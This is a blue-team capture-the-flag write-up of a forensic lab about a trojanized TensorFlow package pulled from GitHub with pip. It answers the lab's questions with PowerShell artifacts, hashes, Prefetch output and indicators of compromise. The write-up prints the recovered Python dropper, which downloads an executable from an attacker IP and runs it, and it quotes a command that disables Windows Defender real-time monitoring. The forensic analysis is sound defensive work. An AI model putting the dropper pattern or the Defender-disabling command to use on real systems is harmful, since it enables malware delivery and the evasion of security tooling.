# Malicious PyPi Lab

![image.png](image.png)

# Table of Contents
- [Context](#context)
- [Scenario](#scenario)
- [Questions](#questions)
  * [Correlating Suspicious Activity Temp Artifacts](#correlating-suspicious-activity-temp-artifacts)
- [Lab Insights](#lab-insights)
- [Forensic Timeline](#forensic-timeline)

# Context

**Lab link**: [https://cyberdefenders.org/blueteam-ctf-challenges/malicious-pypi/](https://cyberdefenders.org/blueteam-ctf-challenges/malicious-pypi/)

**Suggested tools**: EZ Tools, DB Browser for SQLite, Strings, Event Log Explorer

**Tactics**: Execution, Defense Evasion, Command and Control

# Scenario

As a SOC analyst, you were asked to inspect a suspected document that a user received in their inbox. One of your colleagues told you that he could not find anything suspicious. However, throwing the document into the sandboxing solution triggered some alerts. Your job is to investigate the document further and confirm whether it's malicious or not.

# Questions

Q1- Dr. Alex Rivera recently downloaded an external library that raised suspicions about system security. Can you identify the specific command used for this download?

Answer: `pip install git+https://github.com/a1l4m/TensorFlow.git#egg=TensorFlow`

Explanation: The user ran this command from an administrator-level account to install a Python package directly from a Git repository (instead of from the official PyPI index). The `PowerShell` history log file `ConsoleHost_history.txt` records this activity under the user profile path. This aligns with MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) technique `T1059.001` (Command and Scripting Interpreter: PowerShell).

**Command breakdown (what it does)**

- `pip install` — instructs pip to download/install a package into the current Python environment (system-wide if running as admin, otherwise into the user/site environment depending on configuration).
- `git+https://github.com/a1l4m/TensorFlow.git` — tells pip to use the **VCS (Git) install path**, cloning the repository from GitHub and building/installing it locally. This bypasses normal PyPI package vetting and can introduce unreviewed code.
- `#egg=TensorFlow` — sets the *package name label* pip should treat this repo as. This is used for dependency resolution/metadata when installing from VCS URLs.

**Observed result (from the artifact)**

- Confirms the endpoint had `pip` available and that the user attempted to pull code from `github.com/a1l4m/TensorFlow.git` using pip’s Git install capability (i.e., a direct third-party code acquisition event, not a standard `pip install tensorflow` from PyPI).

```powershell
# C:\Users\Administrator\Desktop\Start Here\Artifacts\C\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
Set-ExecutionPolicy -ExecutionPolicy Unrestricted
python -m pip install setuptools
git
pip install git+https://github.com/a1l4m/TensorFlow.git#egg=TensorFlow
./kape.exe --tsource C:\ --tdest '\\vmware-host\Shared Folders\yep' --target KapeTriage --zip finaloutput
```

Q2- During the investigation, you uncover a command that modified the system's security settings, resulting in the deactivation of Windows Defender in a manner that could assist an attacker. What was this command?

Answer: `Set-MpPreference -DisableRealtimeMonitoring $true`

Explanation: The investigation located this command in raw Windows PowerShell event log records in `Windows PowerShell.evtx`. `Set-MpPreference -DisableRealtimeMonitoring $true` disables Microsoft Defender Antivirus real-time monitoring. This change reduces Endpoint Detection and Response (EDR) visibility and can help an attacker evade detection. This behavior aligns with MITRE ATT&CK technique `T1562.001` (Impair Defenses: Disable or Modify Tools), because it directly modifies security tooling to weaken endpoint protections.

Q3- Based on your timeline analysis, at what date and time did you first observe unauthorized changes to the security settings that led to the disabling of Windows Defender?

Answer: `2024-02-26 12:22`

Explanation: Timeline analysis shows multiple instances of the earlier defense evasion activity that disabled Microsoft Defender Antivirus (MDA) real-time monitoring. The earliest observed instance occurred at this date and time, which marks the first unauthorized security configuration change in the collected artifacts.

![image.png](image%201.png)

Q4- After the security settings were compromised, a new file appeared on the system. What is the MD5 hash of this file, indicating its unique identity?

Answer: `23AADF3C98745CF293BFF6B1B0980429`

Explanation: Timeline correlation showed that Microsoft Defender Antivirus (MDA) real-time monitoring was disabled shortly before `setup.exe` was created in the temporary `pip` installation directory shown below. This temporal alignment supports the conclusion.

```powershell
PS C:\Users\Administrator> cd "C:\Users\Administrator\Desktop\Start Here\Artifacts\C\Users\Administrator\AppData\Local\Temp\pip-install-y1w9mdpi\ttensorflow-gpu_67ea8943f00e4a90a57811a568238213"
PS C:\Users\Administrator\Desktop\Start Here\Artifacts\C\Users\Administrator\AppData\Local\Temp\pip-install-y1w9mdpi\ttensorflow-gpu_67ea8943f00e4a90a57811a568238213> Get-FileHash -Path .\setup.exe -Algorithm MD5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             23AADF3C98745CF293BFF6B1B0980429                                       C:\Users\Administrator\Desktop\Start Here\Artifacts\C\Users\Administrator\AppData\Local\Temp\pip-install-y1w9mdpi\ttensorflow-...
```

Q5- Investigate the origin of the malicious file detected on the server. What was the exact URL from which this file was initially downloaded before it started communicating with external C2 servers?

Answer: `hxxp://3.66.85.252:8000/file.exe`

Explanation: The investigation reviewed the `Administrator` profile temporary directory at `C:\Users\Administrator\AppData\Local\Temp` and correlated the creation time of `setup.exe` with earlier timeline events to validate the staging sequence. String analysis identified the already defanged download URL `hxxp://3[.]66[.]85[.]252:8000/file.exe`, which indicates the initial source for the malicious executable before it began command and control (C2) communications with external infrastructure. The artifact review also located the downloaded file `file.exe` under `C:\Program Files\Git\usr\bin\`.

![image.png](image%202.png)

```python

import urllib.request as _urequest
import shutil as _shutil
import subprocess

def _download_file(url, local_file):
    with _urequest.urlopen(url) as response, open(local_file, 'wb') as out_file:
        _shutil.copyfileobj(response, out_file)

def _execute_downloaded_file(file_path):
    subprocess.run(file_path, check=True)

_download_file('hxxp://3.66.85.252:8000/file.exe', 'setup.exe')
_execute_downloaded_file('setup.exe')
```

## Correlating Suspicious Activity Temp Artifacts

**Goal**: Identify suspicious downloads/staging in per-user temporary paths (often used by droppers, script-based payloads, and “living off the land” tooling like `bitsadmin`, PowerShell web requests, or Python `urllib`).

**High-signal locations (per-user)**

- `C:\Users\<USER>\AppData\Local\Temp\`
    - Common: browser/installer staging, `pip-install-*`, self-extractors, script drop zones
- `C:\Users\<USER>\AppData\Local\Microsoft\Windows\INetCache\` (IE/legacy cache, still shows up in artifacts)
- `C:\Users\<USER>\AppData\Local\Microsoft\Windows\WebCache\` (ESE DB: `WebCacheV01.dat`)
- `C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- `C:\Users\<USER>\Downloads\` (baseline check even if “temp focused”)

**What to look for**

- Executables or scripts appearing shortly after suspicious commands/logon:
    - `.exe`, `.dll`, `.ps1`, `.bat`, `.cmd`, `.js`, `.vbs`, `.hta`, `.py`
- URL / IP strings embedded in files (e.g., `http://…/file.exe`, `hxxp://…`)
- “Installer-like” names in temp folders: `setup.exe`, `update.exe`, `install.exe`
- Recently created zip/extract directories: `7z*`, `Rar$*`, `Temp1_*`, `*.tmp`

**Brute-force PowerShell sweeps (live system)**

**1) Recent file creation in common temp paths**

```powershell
$u = $env:USERNAME
$since = (Get-Date).AddDays(-7)
$paths = @(
  "C:\Users\$u\AppData\Local\Temp",
  "C:\Users\$u\Downloads",
  "C:\Users\$u\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"
)

Get-ChildItem -Force -Recurse -File -ErrorAction SilentlyContinue $paths |
  Where-Object { $_.CreationTime -ge $since -or $_.LastWriteTime -ge $since } |
  Sort-Object LastWriteTime -Descending |
  Select-Object FullName, Length, CreationTime, LastWriteTime
```

**2) Search file contents for a specific URL / host / IP**

```powershell
$needle = "3.66.85.252"
$root = "C:\Users\$env:USERNAME\AppData\Local\Temp"

Get-ChildItem -Path $root -Recurse -File -Force -ErrorAction SilentlyContinue |
  Select-String -Pattern $needle -SimpleMatch -ErrorAction SilentlyContinue |
  Select-Object Path, LineNumber, Line
```

**3) Hash likely payloads for pivoting**

```powershell
$root = "C:\Users\$env:USERNAME\AppData\Local\Temp"
$ext = "*.exe","*.dll","*.ps1","*.js","*.vbs","*.bat","*.cmd","*.hta","*.py"

Get-ChildItem $root -Recurse -File -Force -Include $ext -ErrorAction SilentlyContinue |
  Get-FileHash -Algorithm SHA256 |
  Select-Object Hash, Path
```

Q6- The file in the previous question started communicating with an external C2 server. What port was used for this communication?

Answer: `8888`

Explanation: VirusTotal analysis of the Message Digest 5 (MD5) hash `23AADF3C98745CF293BFF6B1B0980429`, associated with the malicious executable `setup.exe`, identified external Internet Protocol (IP) address Indicators of Compromise (IOCs) in the network traffic metadata. These network IOCs support pivoting to the command and control (C2) infrastructure and validating that `setup.exe` initiated outbound communications consistent with C2 activity.

![image.png](image%203.png)

Q7- Attackers often ensure their continued access to a compromised system through persistence mechanisms. When was such a mechanism established in Dr. Rivera's system?

Answer: `2024-02-26 12:36`

Explanation: Attackers can establish persistence in multiple ways. In this case, the attacker created a scheduled task named `SystemUpdatesDaily`, which appears in the Windows Task Scheduler task files directory. Parsing Master File Table (MFT) records from `$MFT` shows the creation timestamp for the task file associated with `SystemUpdatesDaily`.

![image.png](image%204.png)

![image.png](image%205.png)

Q8- After the attacker completed their intrusion, a specific file was left behind on the host system. Based on the information you've gathered, provide the name of this file, which was created shortly after the attacker established persistence on the system.

Answer: `system.exe`

Explanation: The executable `system.exe` was created shortly after the scheduled task `SystemUpdatesDaily` was created, and `\$MFT` records confirm the file creation timestamp.

![image.png](image%206.png)

Q9- Determine the exact moment the malicious file identified in Question 8 began its operation. When was it first executed?

Answer: `2024-02-26 12:42`

Explanation: `PECmd.exe` parsed the Windows Prefetch (`C:\Windows\prefetch`) record `SYSTEM.EXE-52946548.pf` to extract the `system.exe` execution times and their timestamps.

```powershell
PS C:\Users\Administrator\Desktop\Start Here\Tools\ZimmermanTools\net6> .\PECmd.exe -f "C:\Users\Administrator\Desktop\Start Here\Artifacts\C\Windows\prefetch\SYSTEM.EXE-52946548.pf"
PECmd version 1.5.0.0

Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/PECmd

Command line: -f C:\Users\Administrator\Desktop\Start Here\Artifacts\C\Windows\prefetch\SYSTEM.EXE-52946548.pf

Keywords: temp, tmp

Processing C:\Users\Administrator\Desktop\Start Here\Artifacts\C\Windows\prefetch\SYSTEM.EXE-52946548.pf

Created on: 2024-02-27 05:15:22
Modified on: 2024-02-26 12:45:37
Last accessed on: 2024-02-27 05:46:43

Executable name: SYSTEM.EXE
Hash: 52946548
File size (bytes): 19,514
Version: Windows 10 or Windows 11

Run count: 2
Last run: 2024-02-26 12:45:27
Other run times: 2024-02-26 12:42:21
```

Q10- After identifying the malicious file in Question 8, it is crucial to determine the name of the malware family. This information is vital for correlating the attack with known threats and developing appropriate defenses. What is the malware family name for the malicious file in Question 8?

Answer: `aurora`

Explanation: Compute a hash for the malicious `system.exe`, then look up that hash in `VirusTotal` to identify the malware family classification. `Aurora` is a backdoor and Remote Access Trojan (RAT) malware family that supports covert persistence and command and control (C2) on compromised Windows systems. This activity aligns with MITRE ATT&CK technique `T1059` (Command and Scripting Interpreter) when execution relies on scriptable tooling, and `T1053.005` (Scheduled Task) when the threat uses a scheduled task for persistence.

![image.png](image%207.png)

# Lab Insights

- **Abuse of developer supply paths (VCS install):** The key “gotcha” is `pip install git+https://github.com/...`—pip can install straight from Git, which bypasses PyPI-based trust controls and is a common real-world path for pulling unreviewed code.
- **Defense evasion as an enabling step (not an afterthought):** `Set-MpPreference -DisableRealtimeMonitoring $true` shows the operator deliberately reduced host visibility before/while staging payloads—classic “disable protections, then drop/execute.”
- **Temp build directories are a real staging ground:** The malicious `setup.exe` appearing under `...\\AppData\\Local\\Temp\\pip-install-*\\...` highlights that “installer/build” directories created by legitimate tooling can be repurposed to hide payload creation among normal dev artifacts.
- **Clear “download → execute” behavior inside package logic:** The Python snippet using `urllib.request` to fetch `hxxp://3.66.85.252:8000/file.exe` and then run it is effectively dropper behavior embedded in otherwise plausible code paths.
- **Network behavior splits into two roles:**
    - `:8000` = initial payload hosting / staging URL
    - `:8888` = later C2 comms port
    
    This separation is common: simple web server for initial delivery, different endpoint/port for control channel.
    
- **Persistence via Scheduled Task is consistent with enterprise tradecraft:** The scheduled task `SystemUpdatesDaily` is designed to blend into normal system activity (naming masquerade) while providing reliable re-execution—typical Windows persistence pattern.
- **Post-persistence “second payload” pattern:** `system.exe` appearing shortly after the scheduled task suggests a staged intrusion: initial dropper establishes foothold, then a more durable/functional payload is placed and launched.
- **Execution proof via Prefetch is high-confidence:** Prefetch evidence (`SYSTEM.EXE-*.pf`) gives you strong confirmation of first execution time and run count—useful when other logs are missing, manipulated, or ambiguous.
- **IOCs you can immediately pivot on (from the lab):**
    - Host/IP: `3.66.85.252`
    - Ports: `8000` (delivery), `8888` (C2)
    - File hash: `23AADF3C98745CF293BFF6B1B0980429` (setup.exe)
    - Persistence artifact: scheduled task `SystemUpdatesDaily`
- **ATT&CK themes demonstrated end-to-end:** Execution via PowerShell/tooling, **Impair Defenses** (Defender tamper), **Ingress Tool Transfer** (payload download), **C2** (outbound comms), and **Scheduled Task persistence**—a compact but realistic chain.

# Forensic Timeline

![image.png](image%208.png)
